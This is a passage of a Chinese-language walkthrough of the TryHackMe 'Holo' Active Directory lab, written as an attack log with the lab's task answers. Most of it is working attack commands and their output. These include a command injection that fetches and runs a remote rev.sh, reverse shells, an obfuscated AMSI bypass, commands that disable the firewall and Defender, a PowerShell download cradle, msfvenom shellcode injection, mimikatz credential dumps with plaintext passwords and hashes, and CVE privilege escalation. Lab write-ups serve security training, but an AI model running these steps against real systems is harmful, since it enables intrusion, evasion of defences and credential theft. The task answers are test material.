curl http://192.168.100.1:8080/cmd.php?cmd=curl http://10.50.111.108/rev.sh|bash &
```

注意，cmd后面的命令要用urlencode转一次，规避特殊符号引起的麻烦

```
curl http://192.168.100.1:8080/cmd.php?cmd=curl%20http%3A%2F%2F10.50.111.108%2Frev.sh%7Cbash%20%26
```

横向到```L-SRV01```
```
┌──(root💀kali)-[~/tryhackme/holo]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.50.111.108] from (UNKNOWN) [10.200.114.33] 48736
bash: cannot set terminal process group (1845): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-200-112-33:/var/www/html$ whoami
whoami
www-data
ww-data@ip-10-200-112-33:/var/www/html$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:69:87:5e:18:71 brd ff:ff:ff:ff:ff:ff
    inet 10.200.114.33/24 brd 10.200.112.255 scope global dynamic eth0
       valid_lft 3441sec preferred_lft 3441sec
    inet6 fe80::69:87ff:fe5e:1871/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:5b:cf:7e:19 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-19e3b4fa18b8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:39:fc:98:69 brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.1/24 brd 192.168.100.255 scope global br-19e3b4fa18b8
       valid_lft forever preferred_lft forever
    inet6 fe80::42:39ff:fefc:9869/64 scope link 
       valid_lft forever preferred_lft forever
6: vethcde8a5c@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-19e3b4fa18b8 state UP group default 
    link/ether 86:07:fe:d0:3a:b6 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::8407:feff:fed0:3ab6/64 scope link 
       valid_lft forever preferred_lft forever

```

## L-SRV01提权

枚举所有SUID

```
www-data@ip-10-200-112-33:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
<var/www/html$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/docker
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/at
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chsh

```


可以使用docker提权，见[这里](https://gtfobins.github.io/gtfobins/docker/)


使用上面的命令提示没有alpine这个image
```
www-data@ip-10-200-112-33:/home/ubuntu$ /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
<docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
/usr/bin/docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
See '/usr/bin/docker run --help'.

```

查看靶机拥有的image
```
www-data@ip-10-200-112-33:/home/ubuntu$ docker images
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
<none>              <none>              cb1b741122e8        18 months ago       995MB
<none>              <none>              b711fc810515        18 months ago       993MB
<none>              <none>              591bb8cd4ef6        18 months ago       993MB
<none>              <none>              88d15ba62bf4        18 months ago       993MB
ubuntu              18.04               56def654ec22        22 months ago       63.2MB
```

有一个18.04版本的ubuntu，提权到root
```
www-data@ip-10-200-112-33:/home/ubuntu$ /usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
< run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
# whoami
whoami
root

```

查看```/etc/shadow```，用hashcat破解出linux-admin的用户密码是：```linuxrulez```

**Task 20  Privilege Escalation Call me Mario, because I got all the bits**

> What is the full path of the binary with an SUID bit set on L-SRV01?

> /usr/bin/docker

> What is the full first line of the exploit for the SUID bit?

> sudo install -m =xs $(which docker) .

**Task 21  Post Exploitation From the Shadows**

> What non-default user can we find in the shadow file on L-SRV01?

> linux-admin


**Task 22  Post Exploitation Crack all the Things**

> What is the plaintext cracked password from the shadow hash?
> linuxrulez


## chisel配置动态端口转发

kali执行
```
./chisel server -p 8000 --reverse
```

客户端执行
```
./chisel client 10.50.111.108:8000 R:socks
```

```/etc/proxychains4.conf```配置

```
socks5  127.0.0.1 1080
```

ssh登录
```
┌──(root💀kali)-[~]
└─# proxychains ssh linux-admin@10.200.114.33                                                                                                                                                                                         255 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:9050 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:9051 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.200.114.33:22  ...  OK
The authenticity of host '10.200.114.33 (10.200.114.33)' can't be established.
RSA key fingerprint is SHA256:43K5xtSCUtS9tdIFuE60lTb3CLW0O+cPzfiGDj2oCFg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.200.114.33' (RSA) to the list of known hosts.
linux-admin@10.200.114.33's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1030-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jul 28 10:31:10 UTC 2022

  System load:                      0.0
  Usage of /:                       97.3% of 7.69GB
  Memory usage:                     20%
  Swap usage:                       0%
  Processes:                        149
  Users logged in:                  0
  IPv4 address for br-19e3b4fa18b8: 192.168.100.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.200.114.33

  => / is using 97.3% of 7.69GB
  => There is 1 zombie process.

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

107 updates can be installed immediately.
11 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

6 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

Last login: Sat Jan 16 19:48:21 2021 from 10.41.0.2
linux-admin@ip-10-200-112-33:~$ 

```

# S-SRV01

扫描S-SRV01上的服务
```
proxychains nmap -sV -Pn -sT 10.200.112.31 --top-ports=100
Nmap scan report for 10.200.112.31
Host is up (0.71s latency).
Not shown: 92 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
3389/tcp open  ms-wbt-server Microsoft Terminal Services

```


浏览器配置FoxyProxy，走socks5协议
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659082497815.png)

打开S-SRV01所在的web 服务器,又是一个holo.live的登录页
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659082657504.jpg)

点击Forgot password，输入数据库里找到的另一个用户名：```gurag```，在浏览器打开f12调试，查看发送过去服务器的包

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659580867657.jpg)

在浏览器调试工具的```storage->user_token->size```得到cookie大小：110

看到生成了一个user_token，复制它，作为传入参数放到url上的user_token

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659580975880.jpg)


此时来到一个密码reset页面，输入我们重置的密码

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659581100182.jpg)


**Task 28  Web App Exploitation Hide yo' Kids, Hide yo' Wives, Hide yo' Tokens**

> What user can we control for a password reset on S-SRV01?

> gurag

> What is the name of the cookie intercepted on S-SRV01?

> user_token

> What is the size of the cookie intercepted on S-SRV01?

> 110

> What page does the reset redirect you to when successfully authenticated on S-SRV01?

> reset.php

用修改的密码登陆web站点以后是一个上传页面，查看网页源代码，发现上传的过滤放在了客户端
```
<script>
      window.onload = function() {
        var upload = document.getElementById("fileToUpload");
        upload.value="";
        upload.addEventListener("change",function(event) {
          var file = this.files[0];
          if (file.type != "image/jpeg") {
            upload.value="";
            alert("dorkstork server bork");
          }
        });
      };
    </script>
```

利用burp很容易就可以绕过

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659593558274.jpg)

在```images```这个文件夹可以访问到我们上传到php文件

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659593622049.jpg)


现在上传一个win版本的rev.php，拿到一个shell
```
┌──(root💀kali)-[~/tryhackme/holo]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.50.111.108] from (UNKNOWN) [10.200.114.31] 49896
SOCKET: Shell has connected! PID: 528
Microsoft Windows [Version 10.0.17763.1518]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\web\htdocs\images>whoami
nt authority\system

C:\web\htdocs\images>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : holo.live
   Link-local IPv6 Address . . . . . : fe80::81b0:9f04:18cc:b3a0%6
   IPv4 Address. . . . . . . . . . . : 10.200.114.31
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.200.114.1

C:\web\htdocs\images>

```

绕过PS执行策略以及AMSI
```
C:\web\htdocs\images>powershell -ep bypass
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\web\htdocs\images> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
PS C:\web\htdocs\images> 
```

关闭防火墙和实时防护
```
PS C:\web\htdocs\images> NetSh Advfirewall set allprofiles state off
Ok.

PS C:\web\htdocs\images> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.
PS C:\web\htdocs\images> 

```

## Post Exploitation

开启CS

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659594856781.jpg)


拿到一个beacon

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659595176870.jpg)

域信息枚举

引入powervie，获取当前域
```
beacon> powershell-import tools/PowerView.ps1
[*] Tasked beacon to import: /root/CobaltStrike/tools/PowerView.ps1
[+] host called home, sent: 143784 bytes
beacon> powershell Get-Domain
[*] Tasked beacon to run: Get-Domain
[+] host called home, sent: 297 bytes
[+] received output:
#< CLIXML


Forest                  : holo.live
DomainControllers       : {DC-SRV01.holo.live}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : DC-SRV01.holo.live
RidRoleOwner            : DC-SRV01.holo.live
InfrastructureRoleOwner : DC-SRV01.holo.live
Name                    : holo.live

```

获取DC
```
beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl
[*] Tasked beacon to run: Get-DomainController | select Forest, Name, OSVersion | fl
[+] host called home, sent: 425 bytes
[+] received output:
#< CLIXML


Forest    : holo.live
Name      : DC-SRV01.holo.live
OSVersion : Windows Server 2019 Datacenter
```

获取域内所有计算机
```
beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
[*] Tasked beacon to run: Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
[+] host called home, sent: 461 bytes
[+] received output:
#< CLIXML

dnshostname           
-----------           
DC-SRV01.holo.live    
PC-FILESRV01.holo.live
S-SRV01.holo.live     
S-SRV02.holo.live   
```

获取所有域用户
```
beacon> run net users /domain
[*] Tasked beacon to run: net users /domain
[+] host called home, sent: 35 bytes
[+] received output:
The request will be processed at a domain controller for domain holo.live.


User accounts for \\DC-SRV01.holo.live

-------------------------------------------------------------------------------
ad-joiner                Administrator            a-fubukis                
a-koronei                ameliaw                  cocok                    
cryillic                 fubukis                  Guest                    
gurag                    koronei                  krbtgt                   
matsurin                 mikos                    okayun                   
PC-MGR                   spooks                   SRV-ADMIN                
watamet                  WEB-MGR                  

```


获取所有DA
```
beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
[*] Tasked beacon to run: Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
[+] host called home, sent: 481 bytes
[+] received output:
#< CLIXML



MemberDistinguishedName                                           

-----------------------                                           

CN=Shirikami Fubuki,OU=Administration,OU=Employees,DC=holo,DC=live

CN=Inugami Korone,OU=Administration,OU=Employees,DC=holo,DC=live  

CN=SRV ADMIN,OU=Service Accounts,OU=Employees,DC=holo,DC=live     

CN=Administrator,CN=Users,DC=holo,DC=live  
```

DA成员包括：Shirikami Fubuki,Inugami Korone,SRV ADMIN,Administrator


使用mimikatz dump出机器里的登录密码
```
beacon> mimikatz sekurlsa::logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 750714 bytes
[+] received output:

Authentication Id : 0 ; 310162 (00000000:0004bb92)
Session           : Interactive from 1
User Name         : watamet
Domain            : HOLOLIVE
Logon Server      : DC-SRV01
Logon Time        : 8/4/2022 5:42:25 AM
SID               : S-1-5-21-471847105-3603022926-1728018720-1132
  msv : 
   [00000003] Primary
   * Username : watamet
   * Domain   : HOLOLIVE
   * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
   * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
   * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
  tspkg : 
  wdigest : 
   * Username : watamet
   * Domain   : HOLOLIVE
   * Password : (null)
  kerberos :  
   * Username : watamet
   * Domain   : HOLO.LIVE
   * Password : Nothingtoworry!
  ssp : 
  credman : 
```

找到一个用户的明文密码：```watamet : Nothingtoworry! ```


使用cme验证上面的用户密码,扫描AD所在网段（我这里是114）有权限的机器

```
proxychains crackmapexec smb 10.200.114.0/24 -u watamet -d HOLOLIVE -p 'Nothingtoworry!'

<skip..>

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.114.200:445 SMB         10.200.114.30   445    DC-SRV01         [+] holo.live\watamet:Nothingtoworry!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.114.147:445 SMB         10.200.114.35   445    PC-FILESRV01     [+] holo.live\watamet:Nothingtoworry! 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.114.216:445 SMB         10.200.114.31   445    S-SRV01          [+] holo.live\watamet:Nothingtoworry! (Pwn3d!)

```

对```10.200.114.31```有管理员权限
对```10.200.114.30```可以进行身份验证
对```10.200.114.35```可以进行身份验证

**Task 36  Post Exploitation That's not a cat that's a dawg**

> What domain user's credentials can we dump on S-SRV01?

> watamet

> What is the domain user's password that we can dump on S-SRV01?

> Nothingtoworry!

**Task 37  Post Exploitation Good Intentions, Courtesy of Microsoft: Part II**

> What is the hostname of the remote endpoint we can authenticate to?

> PC-FILESRV01

# PC-FILESRV01


10.200.114.35是我们还没有拿下的机器

对10.200.114.35进行扫描
```
┌──(root💀kali)-[~/tryhackme/holo]
└─# proxychains nmap -sT -Pn 10.200.114.35 --top-ports=100                                                                                                                                                                              1 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 22:55 EDT
Nmap scan report for 10.200.114.35
Host is up (0.67s latency).
Not shown: 95 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

```

开启了3389，使用rdp进行远程登录

```
proxychains xfreerdp /u:watamet /p:'Nothingtoworry!' /v:10.200.114.35 +clipboard
```



拿到foothold

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659668437954.jpg)


绕过PS执行策略，关闭AMSI，枚举所有APPLOCKER

```
PS C:\Users\watamet> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\watamet> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
PS C:\Users\watamet> $ExecutionContext.SessionState.LanguageModeConstrainedLanguage
PS C:\Users\watamet> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections


PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659668859646.jpg)

留意第二和第三条APPLOCKER规则里，允许任何用户在```Program Files folder```和```Windows```文件夹下执行任何程序


使用[applocker-bypas-checker.ps1](https://github.com/sparcflow/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1)检查可以写入的文件夹
```
PS C:\Users\watamet> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\watamet> cd .\Desktop\
PS C:\Users\watamet\Desktop> certutil -urlcache -split -f "http://10.50.111.108:88/applocker-bypas-checker.ps1" applocker-bypas-checker.ps1
****  Online  ****
  0000  ...
  0446
CertUtil: -URLCache command completed successfully.
PS C:\Users\watamet\Desktop>
PS C:\Users\watamet\Desktop> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\watamet\Desktop> .\applocker-bypas-checker.ps1
[*] Processing folders recursively in C:\windows
[+]  C:\windows\Tasks
[+]  C:\windows\tracing
[+]  C:\windows\System32\spool\drivers\color
[+]  C:\windows\tracing\ProcessMonitor
```

打开 powershell，执行下面命令，拿到一个beacon

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.50.111.108:80/a'))"
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659670245366.jpg)


远程执行[SharpEDRChecker.exe](https://github.com/PwnDexter/SharpEDRChecker/releases/tag/1.1)

```
beacon> execute-assembly tools/SharpEDRChecker.exe
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659681143334.jpg)



查看检查结果，反病毒软件主要是windows自带的windows defender

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659681691184.jpg)



**Task 39  Situational Awareness So it's just fancy malware?**

> What anti-malware product is employed on PC-FILESRV01?

> amsi

> What anti-virus product is employed on PC-FILESRV01?

> windows defender


把SeatBelt.exe上传到靶机，执行以后结果输出到output.txt
```
c:\Windows\Tasks>.\SeatBelt.exe -group=all >C:\Users\watamet\Desktop\output.txt

c:\Windows\Tasks>
```

结果
```

====== DotNet ======

  Installed CLR Versions
      4.0.30319

  Installed .NET Versions
      4.7.03190

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : False
====== DpapiMasterKeys ======

...


  Installed CLR Versions
      4.0.30319

  Installed PowerShell Versions
      2.0
        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
      5.1.17763.1
...

====== FileInfo ======
  Comments                       : 
  CompanyName                    : Microsoft Corporation
  FileDescription                : NT Kernel & System
  FileName                       : C:\Windows\system32\ntoskrnl.exe
  FileVersion                    : 10.0.17763.1577 (WinBuild.160101.0800)

```

**Task 40  Situational Awareness SEATBELT CHECK!**

> What CLR version is installed on PC-FILESRV01?

> 4.0.30319

> What PowerShell version is installed on PC-FILESRV01?

> 5.1.17763.1

> What Windows build is PC-FILESRV01 running on?

> 17763.1577


## 提权

在用户文件夹有一个kavremover可执行文件
```
beacon> ls C:\Users\watamet\Applications
[*] Tasked beacon to list files in C:\Users\watamet\Applications
[+] host called home, sent: 47 bytes
[*] Listing: C:\Users\watamet\Applications\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 4mb      fil     12/10/2020 23:34:51   kavremover.exe
```

官方说是从这个程序缺失的dll来执行提权

但是从官方描述中我没看明白是从哪里的枚举知道可以用这个程序缺失的dll文件提权的

在这里我决定使用msf自动提权枚举工具

从CS传递一个session给msf

## session passing

1. msf生成payload（支持x64)
```
┌──(root㉿kali)-[~/tryhackme/holo]
└─# msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.50.111.108 LPORT=4242 -f raw -o /root/CobaltStrike/payload/msf.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201308 bytes
Saved as: /root/CobaltStrike/payload/msf.bin
```


2. 注入进程，这里选择记事本（notepad.exe）
```
beacon> execute C:\Windows\System32\notepad.exe
beacon> ps

 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----              
 1072  4792  notepad.exe                  x64   2           HOLOLIVE\watamet

beacon> shinject 1072 x64 payload\msf.bin
```

3. msf收到rev shell
```
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter_reverse_http):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       tun0             yes       The local listener hostname
   LPORT       4242             yes       The local listener port
   LURI                         no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started HTTP reverse handler on http://10.50.111.108:4242
[!] http://10.50.111.108:4242 handling request from 10.200.114.35; (UUID: zdmd8wyn) Without a database connected that payload UUID tracking will not work!
[*] http://10.50.111.108:4242 handling request from 10.200.114.35; (UUID: zdmd8wyn) Redirecting stageless connection from /A5BQvMdAwA5-V39VHLlKzgCQmoCNNwOLQeRnnz78sVYzN-uQk1of4-NsQVO5t8-PMHKdmkqp8UQlZ with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
[!] http://10.50.111.108:4242 handling request from 10.200.114.35; (UUID: zdmd8wyn) Without a database connected that payload UUID tracking will not work!
[*] http://10.50.111.108:4242 handling request from 10.200.114.35; (UUID: zdmd8wyn) Attaching orphaned/stageless session...
[!] http://10.50.111.108:4242 handling request from 10.200.114.35; (UUID: zdmd8wyn) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 3 opened (10.50.111.108:4242 -> 127.0.0.1 ) at 2022-08-06 05:30:12 -0400

meterpreter > getuid
Server username: HOLOLIVE\watamet
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  6
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:94:8e:24:ab:23
MTU          : 9001
IPv4 Address : 10.200.114.35
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::5c88:e884:e5fe:5fa
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > 

```

## 提权枚举

使用```post/multi/recon/local_exploit_suggester```自动枚举模块

```
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.200.114.35 - Collecting local exploits for x64/windows...
[*] 10.200.114.35 - 32 exploit checks are being tried...
[+] 10.200.114.35 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.200.114.35 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.200.114.35 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows 10 v1809 build was detected!
[+] 10.200.114.35 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
[+] 10.200.114.35 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[*] Post module execution completed

```

使用```exploit/windows/local/cve_2021_40449```模块提权到system

```
msf6 exploit(windows/local/cve_2021_40449) > run

[*] Started reverse TCP handler on 10.50.111.108:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Target's build number: 10.0.17763.1577
[+] The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
[*] Launching msiexec to host the DLL...
[+] Process 5092 launched.
[*] Reflectively injecting the DLL into 5092...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200262 bytes) to 10.200.114.35
[*] Meterpreter session 4 opened (10.50.111.108:4444 -> 10.200.114.35:52297 ) at 2022-08-06 05:44:38 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

hashdump
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:947722a39b2fc20c72c0d7626cf147b8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
meterpreter >
```

**Task 43  Privilege Escalation WERE TAKING OVER THIS DLL!**

> What is the name of the vulnerable application found on PC-FILESRV01?

> kavremover


## 主机持久性
根据lab指引,第一个缺失的dll文件应该是：```wow64log.dll```

![img](https://i.imgur.com/8xu1QAf.png)

**Task 44  Persistence WERE TAKING OVER THIS DLL! Part: II**

> What is the first listed vulnerable DLL located in the Windows folder from the application

> wow64log.dll

这里主要是通过劫持系统软件缺失的dll文件来执行恶意代码，这样每当重启系统或者重启软件时我们都能获得一个rev shell，从而获得持久性
但是上面我们已经有了administrator的哈希，理论上也可以实现主机持久性，当然如果管理员改了密码那就不行了



## NTLM Relay

1. 获得一个system权限的beacon
```
beacon> run whoami
[*] Tasked beacon to run: whoami
[+] host called home, sent: 24 bytes
[+] received output:
nt authority\system

```

2. 把靶机的445端口转发到kali的445（因为我的CS客户端是在kali开启，所以kali的地址填127.0.0.1）
```
beacon> rportfwd 445 127.0.0.1 445
[+] started reverse port forward on 445 to 127.0.0.1:445
[*] Tasked beacon to forward port 445 to 127.0.0.1:445
[+] host called home, sent: 10 bytes

```


